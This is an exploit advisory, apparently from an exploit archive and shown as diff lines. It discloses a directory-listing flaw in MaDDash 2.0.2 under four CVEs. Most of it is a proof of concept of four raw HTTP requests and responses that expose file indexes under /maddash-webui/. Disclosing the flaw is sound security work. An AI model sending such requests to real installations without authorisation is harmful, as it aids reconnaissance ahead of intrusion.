@@ -1,0 +1,135 @@
+# Exploit Title: MaDDash 2.0.2 - Directory Listing
+# Date: 2018-06-18
+# Vendor: perfSONAR
+# Download Link: https://github.com/esnet/maddash/archive/master.zip
+# Version: 2.0.2 
+# Exploit Author: ManhNho 
+# CVE: CVE-2018-12522,CVE-2018-12523,CVE-2018-12524,CVE-2018-12525
+# Category: Webapps
+# Tested on: Windows 7
+
+--- Description ---
+A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.
+A directory listing provides an attacker with the complete index of all the resources located inside of the directory. 
+The specific risks and consequences vary depending on which files are listed and accessible.
+
+---Affected items---
+http://127.0.0.1/maddash-webui/etc/
+http://127.0.0.1/maddash-webui/lib/
+http://127.0.0.1/maddash-webui/images/
+http://127.0.0.1/maddash-webui/style/
+
+--- PoC ---
+
+[*] Request 1:
+GET /maddash-webui/etc/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: color=Gray Unknown
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+[*] Response 1:
+HTTP/1.1 200 OK
+Date: Sun, 17 Jun 2018 19:48:30 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 876
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /maddash-webui/etc</title>
+ </head>
+ <body>
+<h1>Index of /maddash-webui/etc</h1>
+--------------------------------------------------------------------------------------
+
+[*] Request 2:
+GET /maddash-webui/lib/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: color=Gray Unknown
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+[*] Response 2:
+HTTP/1.1 200 OK
+Date: Sun, 17 Jun 2018 19:48:31 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 2555
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /maddash-webui/lib</title>
+ </head>
+ <body>
+<h1>Index of /maddash-webui/lib</h1>
+--------------------------------------------------------------------------------------
+
+[*] Request 3:
+GET /maddash-webui/style/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: color=Gray Unknown
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+[*] Response 3:
+HTTP/1.1 200 OK
+Date: Sun, 17 Jun 2018 19:52:51 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 1928
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /maddash-webui/style</title>
+ </head>
+ <body>
+<h1>Index of /maddash-webui/style</h1>
+--------------------------------------------------------------------------------------
+
+[*] Request 4:
+GET /maddash-webui/images/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: color=Gray Unknown
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+[*] Response 4:
+HTTP/1.1 200 OK
+Date: Sun, 17 Jun 2018 19:53:02 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 2143
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /maddash-webui/images</title>
+ </head>
+ <body>
+<h1>Index of /maddash-webui/images</h1>
